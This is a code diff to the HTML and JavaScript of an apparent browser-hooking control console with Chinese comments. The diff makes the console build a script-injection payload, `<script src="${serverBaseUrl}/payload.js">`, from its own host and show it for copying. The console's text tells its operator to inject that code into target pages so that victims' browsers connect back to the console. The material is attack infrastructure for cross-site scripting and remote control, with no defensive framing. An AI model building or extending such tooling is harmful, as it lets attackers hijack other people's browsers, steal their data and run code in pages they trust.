@@ -401,7 +401,7 @@
                 </button>
             </div>
             <div class="payload-code" id="payloadCode">
-                &lt;script src="http://localhost:8080/payload.js"&gt;&lt;/script&gt;
+                <!-- 将由JavaScript动态填充 -->
             </div>
             <p style="opacity: 0.9; font-size: 0.9rem; margin-top: 1rem;">
                 将上述代码注入到目标页面即可建立连接。客户端将自动连接到控制台。
@@ -464,9 +464,27 @@
             document.getElementById('uptime').textContent = uptime;
         }
 
+        // 获取服务器配置并设置 Payload
+        let serverBaseUrl = '';
+        
+        function getServerConfig() {
+            // 从当前URL获取基础URL
+            const protocol = window.location.protocol;
+            const host = window.location.host;
+            serverBaseUrl = `${protocol}//${host}`;
+            
+            // 设置 Payload 代码
+            updatePayloadCode();
+        }
+        
+        function updatePayloadCode() {
+            const payloadCode = `<script src="${serverBaseUrl}/payload.js"><\/script>`;
+            document.getElementById('payloadCode').innerHTML = payloadCode;
+        }
+        
         // 复制 Payload
         function copyPayload() {
-            const payloadText = '<script src="http://localhost:8080/payload.js"><\/script>';
+            const payloadText = `<script src="${serverBaseUrl}/payload.js"><\/script>`;
             navigator.clipboard.writeText(payloadText).then(() => {
                 const btn = event.target.closest('button');
                 const originalText = btn.innerHTML;
@@ -817,6 +835,9 @@
 
         // 初始化
         document.addEventListener('DOMContentLoaded', () => {
+            // 获取服务器配置
+            getServerConfig();
+            
             // 添加表头排序事件
             const headers = document.querySelectorAll('#clientsTable th[data-sort]');
             headers.forEach(header => {
